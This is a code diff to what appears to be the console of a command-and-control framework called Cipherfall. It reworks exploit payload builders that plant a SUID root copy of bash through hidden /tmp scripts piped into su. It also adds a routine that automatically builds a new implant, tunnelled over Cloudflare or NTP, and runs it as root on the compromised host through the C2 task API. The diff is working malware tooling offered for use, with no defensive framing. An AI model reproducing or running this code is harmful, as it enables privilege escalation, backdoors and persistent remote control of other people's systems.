@@ -647,16 +647,21 @@ def _build_privesc_payload(exploit: str, tag: str) -> "str | None":
         if not src.exists():
             return None
         script = src.read_text()
-        patched = script.replace('g.system("su")', 'g.system("su </dev/null 2>&1")')
+        # Backdoor must run INSIDE python3 (fd still open = page cache patch active).
+        # Trailing \n in the printf format string makes /bin/sh read the piped commands.
+        inner_cmd = (
+            "g.system(\"printf 'cp /bin/bash " + bd + "; chmod +s " + bd + ";"
+            " echo [privesc:ok] copyfail; id\\n' | /bin/su 2>/dev/null"
+            " || printf 'cp /bin/bash " + bd + "; chmod +s " + bd + ";"
+            " echo [privesc:ok] copyfail; id\\n' | /usr/bin/su 2>/dev/null\")"
+        )
+        patched = script.replace('g.system("su")', inner_cmd)
         b64 = base64.b64encode(patched.encode()).decode()
         return (
             f"BD={bd}; T=/tmp/.{tag}cf.py; "
             f"printf '%s' '{b64}' | base64 -d > $T; "
-            f"python3 $T </dev/null 2>&1; "
-            f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /bin/su 2>/dev/null "
-            f"|| printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /usr/bin/su 2>/dev/null; "
-            f"if [ -u \"$BD\" ]; then "
-            f"echo '[privesc:ok] copyfail'; $BD -p -c 'id'; "
+            f"python3 $T 2>&1; "
+            f"if [ -u \"$BD\" ]; then $BD -p -c 'id'; "
             f"else echo '[privesc:fail] copyfail'; fi; rm -f $T"
         )
     if exploit == "dirtyfrag":
@@ -708,16 +713,18 @@ def _build_privesc_auto(tag: str) -> "str | None":
     df_src = _PRIVESC_DIR / "dirtyfrag" / "exp"
     if cf_src.exists():
         script = cf_src.read_text()
-        patched = script.replace('g.system("su")', 'g.system("su </dev/null 2>&1")')
-        b64cf = base64.b64encode(patched.encode()).decode()
+        inner_cmd = (
+            "g.system(\"printf 'cp /bin/bash " + bd + "; chmod +s " + bd + ";"
+            " echo [privesc:ok] copyfail; id\\n' | /bin/su 2>/dev/null"
+            " || printf 'cp /bin/bash " + bd + "; chmod +s " + bd + ";"
+            " echo [privesc:ok] copyfail; id\\n' | /usr/bin/su 2>/dev/null\")"
+        )
+        b64cf = base64.b64encode(script.replace('g.system("su")', inner_cmd).encode()).decode()
         parts.append(
             f"if python3 -c 'import sys; assert sys.version_info>=(3,10)' 2>/dev/null; then "
             f"T=/tmp/.{tag}cf.py; printf '%s' '{b64cf}' | base64 -d > $T; "
-            f"python3 $T </dev/null 2>&1; "
-            f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /bin/su 2>/dev/null "
-            f"|| printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /usr/bin/su 2>/dev/null; "
-            f"rm -f $T; "
-            f"if [ -u \"$BD\" ]; then echo '[privesc:ok] copyfail'; $BD -p -c 'id'; DONE=1; fi; "
+            f"python3 $T 2>&1; rm -f $T; "
+            f"if [ -u \"$BD\" ]; then $BD -p -c 'id'; DONE=1; fi; "
             f"[ -z \"$DONE\" ] && echo '[privesc:fail] copyfail'; fi"
         )
     if df_src.exists():
@@ -1171,6 +1178,55 @@ class CipherfallTUI(App):
         if self._selected_task:
             await self._show_output(self._selected_task)
 
+    async def _spawn_root_agent(self, agent_id: str, tag: str) -> None:
+        log = self.query_one("#output-log", OutputTextArea)
+        bd  = f"/tmp/.b{tag}"
+        base_url = self._agent_base.get(agent_id, BASE)
+        try:
+            async with httpx.AsyncClient() as c:
+                agents_list = (await c.get(f"{base_url}/admin/agents", timeout=3)).json()
+        except Exception as e:
+            log.write(f"[red]root-agent: cannot reach C2: {e}[/red]")
+            return
+        info = next((a for a in agents_list if a["id"] == agent_id), None)
+        if not info:
+            log.write("[red]root-agent: agent not found in C2[/red]")
+            return
+        sysinfo    = json.loads(info.get("sysinfo", "{}"))
+        worker_url = sysinfo.get("worker_url", "")
+        is_ntp     = worker_url.startswith("ntp://")
+        psk        = _DEFAULT_PSK or "changeme"
+        rtag       = uuid.uuid4().hex[:8]
+        try:
+            if is_ntp:
+                m          = re.match(r"ntp://([^:]+)", worker_url)
+                c2_direct  = m.group(1) if m else ""
+                out_path   = await asyncio.to_thread(
+                    _bake_agent_ntp, psk, 30, 10, f"_root_{rtag}.py", 443, c2_direct
+                )
+            else:
+                out_path   = await asyncio.to_thread(
+                    _bake_agent_cloudflare, _DEFAULT_URL, psk, 30, 10, f"_root_{rtag}.py"
+                )
+            agent_b64 = base64.b64encode(out_path.read_bytes()).decode()
+            out_path.unlink(missing_ok=True)
+        except Exception as e:
+            log.write(f"[red]root-agent: bake failed: {e}[/red]")
+            return
+        ra = f"/tmp/.r{rtag}.py"
+        spawn_cmd = (
+            f"printf '%s' '{agent_b64}' | base64 -d > {ra}; "
+            f"{bd} -p -c 'nohup python3 {ra} >/dev/null 2>&1 & echo ok'; "
+            f"echo '[rootagent:spawned]'"
+        )
+        try:
+            async with httpx.AsyncClient() as c:
+                await c.post(f"{base_url}/admin/task",
+                             json={"agent_id": agent_id, "command": spawn_cmd}, timeout=5)
+            log.write(f"[yellow]root agent deploy sent ({rtag}) — watch Agents tab[/yellow]")
+        except Exception as e:
+            log.write(f"[red]root-agent: dispatch failed: {e}[/red]")
+
     async def _show_output(self, task_id: str) -> None:
         base = self._agent_base.get(self._selected_agent or "", BASE)
         try:
@@ -1247,7 +1303,8 @@ class CipherfallTUI(App):
             if out:
                 log.write_raw(out.strip())
                 if "[privesc:ok]" in out:
-                    log.write("[bold green]root obtained — SUID bash planted[/bold green]")
+                    log.write("[bold green]root obtained — SUID bash planted — spawning root agent…[/bold green]")
+                    asyncio.create_task(self._spawn_root_agent(px["agent_id"], px["tag"]))
                 elif "[ssh-keysign:ok]" in out:
                     log.write("[bold green]ssh-keysign: host keys extracted[/bold green]")
                 elif "[privesc:fail] all" in out:
